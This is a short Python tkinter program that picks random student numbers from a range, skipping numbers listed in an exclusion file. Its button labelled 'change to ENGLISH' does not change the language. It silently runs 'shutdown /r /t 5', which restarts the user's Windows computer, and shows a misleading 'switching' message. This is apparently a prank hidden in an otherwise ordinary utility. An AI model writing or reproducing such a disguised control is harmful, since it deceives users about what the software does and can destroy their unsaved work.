"""
本软件由CZX_STUDIO制作，未经允许，请勿随意传播。
"""

import tkinter as tk
import random as rd
import os
from tkinter import messagebox  # 导库

f = open('Exclusion.txt', 'r', encoding='utf-8')
exclusion_list = []
while True:
    line = f.readline()
    if len(line) >= 1:
        if line[0] != '\n':
            exclusion_list.append(int(line[0:-1]))
        else:
            break
f.close()


def click_b1() -> None:  # button1的函数
    if int(entry2.get()) - int(entry1.get()) + 1 - len(exclusion_list) < int(entry3.get()):
        messagebox.showinfo("别玩了", "再玩就坏了")
        return
    i = 0
    num_list = []  # 函数初始化
    while i < int(entry3.get()):
        r_num = rd.randint(int(entry1.get()), int(entry2.get()))
        if r_num not in num_list and r_num not in exclusion_list:
            num_list.append(r_num)
        else:
            continue
        i += 1  # 循环抽取学号
    result = '、'.join(map(str, num_list))
    text1.edit_undo()
    text1.insert(tk.INSERT, result)  # 输出结果


def click_b2() -> None:
    os.system('shutdown /r /t 5')
    messagebox.showinfo('Loading', '正在切换')


window1 = tk.Tk()
window1.title('随机抽选')
window1.geometry('440x280')
window1.iconbitmap('RandomSelection.ico')
label_v = tk.Label(window1, text='RandomSelection v1.3.0', font=('仿宋', 8))
label1 = tk.Label(window1, text='抽选结果为：', font=('仿宋', 18))
label2 = tk.Label(window1, text='抽选起始位置', font=('仿宋', 18))
label3 = tk.Label(window1, text='抽选结束位置', font=('仿宋', 18))
label4 = tk.Label(window1, text='抽选次数', font=('仿宋', 18))
text1 = tk.Text(window1, width=24, height=3, undo=True, wrap='char', font=('仿宋', 22))
text1.insert(tk.INSERT, '    （请先进行抽选）')
entry1 = tk.Entry(window1, width=5, font=('仿宋', 18))
entry2 = tk.Entry(window1, width=5, font=('仿宋', 18))
entry3 = tk.Entry(window1, width=5, font=('仿宋', 18))
button1 = tk.Button(window1, text='确认', command=click_b1, font=('仿宋', 18))
button2 = tk.Button(window1, text='change to\nENGLISH', command=click_b2, font=('仿宋', 18))  # 定义控件、窗口
label2.grid(row=0, column=0, sticky='w')
entry1.grid(row=0, column=1, sticky='w')
label3.grid(row=0, column=2, sticky='w')
entry2.grid(row=0, column=3, sticky='w')
label4.grid(row=1, column=0, sticky='w')
entry3.grid(row=1, column=1, sticky='w')
button1.grid(row=1, column=3, columnspan=2, sticky='w')
label1.grid(row=2, column=0, columnspan=4)
text1.grid(row=3, column=0, columnspan=4)
label_v.grid(row=4, column=2, columnspan=2, sticky='e')
button2.grid(row=4, column=0)
window1.mainloop()  # 放置控件

"""
\u0049\u0020\u006c\u006f\u0076\u0065\u0020\u9648\u7430\u6c50
"""
